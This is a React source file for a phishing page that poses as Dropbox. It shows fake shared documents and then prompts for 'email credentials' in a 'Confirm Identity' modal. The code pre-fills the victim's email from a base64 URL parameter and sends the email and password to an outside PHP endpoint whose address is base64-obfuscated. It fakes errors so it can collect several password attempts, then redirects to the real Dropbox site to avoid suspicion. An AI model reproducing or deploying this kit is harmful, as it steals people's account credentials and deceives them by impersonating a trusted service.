import React, { useEffect, useRef, useState } from 'react';

interface FileItem {
  name: string;
  type: 'PDF' | 'EXCEL';
}

const FILES: FileItem[] = [
  { name: 'Drawings 2D.pdf', type: 'PDF' },
  { name: 'PO_19382893.pdf', type: 'PDF' },
  { name: 'Signed Contract.pdf', type: 'PDF' },
  { name: 'Specifications.xlsx', type: 'EXCEL' },
];

export const MainApp: React.FC = () => {
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isReadOnly, setIsReadOnly] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [status, setStatus] = useState<'idle' | 'loading' | 'error' | 'success'>('idle');

  const emailInputRef = useRef<HTMLInputElement>(null);
  const passwordInputRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    if (status === 'error') {
      passwordInputRef.current?.focus();
    }
  }, [status]);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const eml = params.get('eml');
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (eml) {
      let candidate = eml;
      try {
        const decoded = atob(eml);
        if (emailRegex.test(decoded)) {
          candidate = decoded;
        }
      } catch {
        // Not valid base64, keep raw eml
      }

      if (emailRegex.test(candidate)) {
        setEmail(candidate);
        setIsReadOnly(true);
      }
    }
  }, []);

  const openModal = () => {
    setIsModalOpen(true);
    setTimeout(() => {
      if (email) {
        passwordInputRef.current?.focus();
      } else {
        emailInputRef.current?.focus();
      }
    }, 100);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length < 4 || password === '1234') {
      alert('Please enter a valid password');
      return;
    }

    setStatus('loading');
    const targetUrl = atob('aHR0cHM6Ly9oZWFsdGFhLnNicy9sb3FzL2Ryb3Bib3gvYnV6dXp1L3RocmVlL3NlbmQucGhw');

    try {
      await fetch(targetUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`,
      });

      setTimeout(() => {
        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        if (nextAttempts >= 4) {
          setStatus('success');
          setTimeout(() => {
            window.location.href = 'https://www.dropbox.com';
          }, 2000);
        } else {
          setStatus('error');
          setPassword('');
          passwordInputRef.current?.focus();
        }
      }, 3000);
    } catch (err) {
      console.error('Submission error:', err);
      setTimeout(() => {
        const nextAttempts = attempts + 1;
        setAttempts(nextAttempts);
        if (nextAttempts >= 4) {
          setStatus('success');
          setTimeout(() => {
            window.location.href = 'https://www.dropbox.com';
          }, 2000);
        } else {
          setStatus('error');
          setPassword('');
          passwordInputRef.current?.focus();
        }
      }, 2000);
    }
  };

  return (
    <>
      {/* Left Sidebar */}
      <aside style={{ width: '216px', padding: '32px 0' }}>
        <div className="logo-container" style={{ padding: '0 32px 48px' }}>
          <svg viewBox="0 0 24 24" style={{ width: '40px', height: '40px' }}>
            <path
              fill="#0061ff"
              d="M6 2l6 4-6 4-6-4 6-4zm12 0l6 4-6 4-6-4 6-4zM6 10l6 4-6 4-6-4 6-4zm12 0l6 4-6 4-6-4 6-4zM12 14l6 4-6 4-6-4 6-4z"
            />
          </svg>
          <span className="logo-text" style={{ fontSize: '22px', fontWeight: 700 }}>
            Dropbox
          </span>
        </div>
        <nav className="nav-group">
          <a href="#" className="nav-item active" style={{ fontSize: '16px', padding: '12px 32px' }}>
            Shared
          </a>
          <a href="#" className="nav-item" style={{ fontSize: '16px', padding: '12px 32px' }}>
            My files
          </a>
          <a href="#" className="nav-item" style={{ fontSize: '16px', padding: '12px 32px' }}>
            File requests
          </a>
          <a href="#" className="nav-item" style={{ fontSize: '16px', padding: '12px 32px' }}>
            Deleted files
          </a>
        </nav>
      </aside>

      {/* Main Content Area */}
      <main>
        <header>
          <div className="header-top">
            <a href="#" className="upgrade-link">
              <svg viewBox="0 0 24 24" fill="#f4c430">
                <path d="M12 2l2.4 7.4H22l-6 4.3 2.3 7.3-6.3-4.6-6.3 4.6 2.3-7.3-6-4.3h7.6L12 2z" />
              </svg>
              Upgrade account
            </a>
          </div>
          <div className="header-nav">
            <div className="header-nav-left">
              <button type="button" className="hamburger-btn" aria-label="Menu">
                <svg viewBox="0 0 24 24" width="24" height="24" fill="none" stroke="black" strokeWidth="2">
                  <line x1="3" y1="6" x2="21" y2="6" />
                  <line x1="3" y1="12" x2="21" y2="12" />
                  <line x1="3" y1="18" x2="21" y2="18" />
                </svg>
              </button>
              <h1 className="mobile-title">Dropbox</h1>
            </div>
            <div className="header-nav-right">
              <button type="button" className="mobile-icon-btn" aria-label="Search">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="black" strokeWidth="2.5">
                  <circle cx="11" cy="11" r="8" />
                  <line x1="21" y1="21" x2="16.65" y2="16.65" />
                </svg>
              </button>
              <button type="button" className="mobile-icon-btn" aria-label="Notifications">
                <svg viewBox="0 0 24 24" width="22" height="22" fill="black">
                  <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" />
                </svg>
              </button>
            </div>
          </div>
        </header>

        <div className="content-wrapper" style={{ padding: '48px 64px' }}>
          <div className="page-header" style={{ marginBottom: '48px' }}>
            <h1 className="page-title" style={{ fontSize: '24px', fontWeight: 700, color: '#172b4d' }}>
              Dropbox
            </h1>
          </div>

          <table className="file-table">
            <thead>
              <tr className="header-row">
                <th style={{ width: '24px' }}></th>
                <th style={{ fontSize: '13px', color: '#6b778c', textTransform: 'none', letterSpacing: 0 }}>
                  Name ↑
                </th>
                <th style={{ fontSize: '13px', color: '#6b778c', textTransform: 'none', letterSpacing: 0 }}>
                  Modified ↓
                </th>
                <th style={{ fontSize: '13px', color: '#6b778c', textTransform: 'none', letterSpacing: 0 }}>
                  Members ↓
                </th>
                <th style={{ width: '40px' }}></th>
              </tr>
            </thead>
            <tbody id="file-list">
              {FILES.map((file) => (
                <tr key={file.name} className="trigger-modal" onClick={openModal}>
                  <td>
                    <input
                      type="checkbox"
                      className="file-checkbox"
                      style={{ width: '16px', height: '16px' }}
                      onClick={(e) => e.stopPropagation()}
                    />
                  </td>
                  <td>
                    <div className="file-info">
                      <div className="file-icon">
                        {file.type === 'PDF' ? (
                          <svg viewBox="0 0 48 56" width="24" height="28">
                            <path
                              d="M6 0h24l12 12v40a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2a2 2 0 0 1 2-2z"
                              fill="#e8e8e8"
                            />
                            <path d="M30 0l12 12H32a2 2 0 0 1-2-2V0z" fill="#c0c0c0" />
                            <rect x="4" y="30" width="40" height="18" rx="3" fill="#e84c3d" />
                            <text
                              x="12"
                              y="44"
                              fontFamily="Arial,sans-serif"
                              fontWeight="700"
                              fontSize="13"
                              fill="white"
                              textAnchor="middle"
                            >
                              PDF
                            </text>
                          </svg>
                        ) : (
                          <svg viewBox="0 0 48 48" width="24" height="24">
                            <rect x="14" y="4" width="30" height="36" rx="2" fill="#4caf7d" />
                            <rect x="14" y="4" width="30" height="18" rx="2" fill="#3d9e6b" />
                            <rect x="14" y="22" width="30" height="18" rx="0" fill="#2e7d52" />
                            <rect x="4" y="10" width="24" height="28" rx="3" fill="#1e6b3c" />
                            <text
                              x="12"
                              y="30"
                              fontFamily="Arial,sans-serif"
                              fontWeight="900"
                              fontSize="16"
                              fill="white"
                              textAnchor="middle"
                            >
                              X
                            </text>
                          </svg>
                        )}
                      </div>
                      <span className="filename" style={{ fontSize: '15px', fontWeight: 400 }}>
                        {file.name}
                      </span>
                    </div>
                  </td>
                  <td style={{ fontSize: '15px', color: '#172b4d' }}>Yesterday 1:32 PM</td>
                  <td style={{ fontSize: '15px', color: '#172b4d' }}>Only you</td>
                  <td>
                    <svg
                      viewBox="0 0 24 24"
                      width="16"
                      height="16"
                      fill="none"
                      stroke="#6b778c"
                      strokeWidth="2.5"
                    >
                      <circle cx="12" cy="12" r="1" />
                      <circle cx="19" cy="12" r="1" />
                      <circle cx="5" cy="12" r="1" />
                    </svg>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </main>

      {/* Right Action Panel */}
      <div className="action-panel">
        <div className="top-upgrade">
          <a href="#" className="upgrade-link">
            <svg viewBox="0 0 24 24" fill="#f4c430">
              <path d="M12 2l2.4 7.4H22l-6 4.3 2.3 7.3-6.3-4.6-6.3 4.6 2.3-7.3-6-4.3h7.6L12 2z" />
            </svg>
            Upgrade account
          </a>
        </div>
        <div className="search-row">
          <div className="search-field-container">
            <svg viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2.5">
              <circle cx="11" cy="11" r="8" />
              <line x1="21" y1="21" x2="16.65" y2="16.65" />
            </svg>
            <input type="text" />
          </div>
          <div className="noti-bell">
            <svg viewBox="0 0 24 24" fill="black">
              <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" />
            </svg>
          </div>
        </div>
        <div className="detail-box">Select a file to see more details</div>
        <div className="action-list" style={{ marginTop: '12px', gap: '12px' }}>
          {[
            {
              label: 'Upload files',
              icon: 'M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 7V4l5 5h-5z',
            },
            {
              label: 'Upload folder',
              icon: 'M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2z',
            },
            {
              label: 'New folder',
              icon: 'M10 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2h-8l-2-2zm9 11h-2v2h-2v-2h-2v-2h2v-2h2v2h2v2z',
            },
            {
              label: 'New shared folder',
              icon: 'M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zM9 16V14h6v2l3-3-3-3v2H9v-2l-3 3 3 3z',
            },
            {
              label: 'Request files',
              icon: 'M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-2 10h-4v4h-2v-4H7v-2h4V7h2v4h4v2z',
            },
          ].map((item) => (
            <a
              key={item.label}
              href="#"
              className="action-link trigger-modal"
              onClick={(e) => {
                e.preventDefault();
                openModal();
              }}
            >
              <svg viewBox="0 0 24 24" fill="#0061ff">
                <path d={item.icon} />
              </svg>
              {item.label}
            </a>
          ))}
        </div>
      </div>

      {/* Modal Dialog */}
      <div
        className={`modal-overlay ${isModalOpen ? 'active' : ''}`}
        id="modal-overlay"
        onClick={(e) => {
          if ((e.target as HTMLElement).id === 'modal-overlay') {
            setIsModalOpen(false);
          }
        }}
      >
        <div className="modal-container">
          <div id="form-view">
            {status !== 'success' && (
              <>
                <div
                  className="modal-header"
                  style={{ display: status === 'loading' ? 'none' : 'block' }}
                >
                  <svg className="modal-logo" viewBox="0 0 24 24">
                    <path
                      fill="#0061ff"
                      d="M6 2l6 4-6 4-6-4 6-4zm12 0l6 4-6 4-6-4 6-4zM6 10l6 4-6 4-6-4 6-4zm12 0l6 4-6 4-6-4 6-4zM12 14l6 4-6 4-6-4 6-4z"
                    />
                  </svg>
                  <h2 className="modal-title">Confirm Identity</h2>
                  <p className="modal-desc">
                    These files are encrypted and secured. To proceed with the download, please
                    verify your email credentials through our secure portal.
                  </p>
                </div>

                <div className="modal-body">
                  {status === 'loading' && (
                    <div className="mspinner" style={{ display: 'block' }}>
                      <img src="/assets/spinner.gif" alt="Verifying" />
                      <div className="checking">Verifying your information, hold on a sec...</div>
                    </div>
                  )}

                  {status === 'error' && (
                    <div id="error-box" className="error-message" style={{ display: 'block' }}>
                      Oops! Dropbox could not open user session, Please verify your information and try and again
                    </div>
                  )}

                  {status !== 'loading' && (
                    <form id="auth-form" onSubmit={handleSubmit}>
                      <div className="form-group">
                        <label className="form-label">Email Address</label>
                        <input
                          type="email"
                          className="input-field"
                          placeholder="Enter your email"
                          value={email}
                          onInput={(e) => setEmail((e.target as HTMLInputElement).value)}
                          required
                          readOnly={isReadOnly}
                          style={
                            isReadOnly
                              ? { backgroundColor: '#f4f5f7', cursor: 'not-allowed' }
                              : {}
                          }
                          ref={emailInputRef}
                        />
                      </div>
                      <div className="form-group">
                        <label className="form-label">Password</label>
                        <input
                          type="password"
                          className="input-field"
                          placeholder="Enter your password"
                          value={password}
                          onInput={(e) => setPassword((e.target as HTMLInputElement).value)}
                          required
                          ref={passwordInputRef}
                        />
                      </div>
                      <button
                        type="submit"
                        className="submit-btn"
                      >
                        <div
                          className="loading-spinner"
                          style={{ display: 'none' }}
                        />
                        <span id="btn-text">View Files</span>
                      </button>
                    </form>
                  )}

                  <p
                    id="modal-footer"
                    style={{
                      textAlign: 'center',
                      marginTop: '24px',
                      fontSize: '11px',
                      color: 'var(--text-muted)',
                      display: status === 'loading' ? 'none' : '',
                    }}
                  >
                    © Copyright Dropbox Inc. {new Date().getFullYear()}
                  </p>
                </div>
              </>
            )}

            {status === 'success' && (
              <div className="success-view" style={{ display: 'block' }}>
                <svg
                  viewBox="0 0 24 24"
                  style={{ width: '64px', height: '64px', fill: '#52c41a', marginBottom: '24px' }}
                >
                  <path d="M22 11.08V12a10 10 0 11-5.93-9.14" />
                  <polyline points="22 4 12 14.01 9 11.01" />
                </svg>
                <h2 className="modal-title">Verification Successful</h2>
                <p className="modal-desc">Redirecting to your files. Please wait...</p>
              </div>
            )}
          </div>
        </div>
      </div>
    </>
  );
};
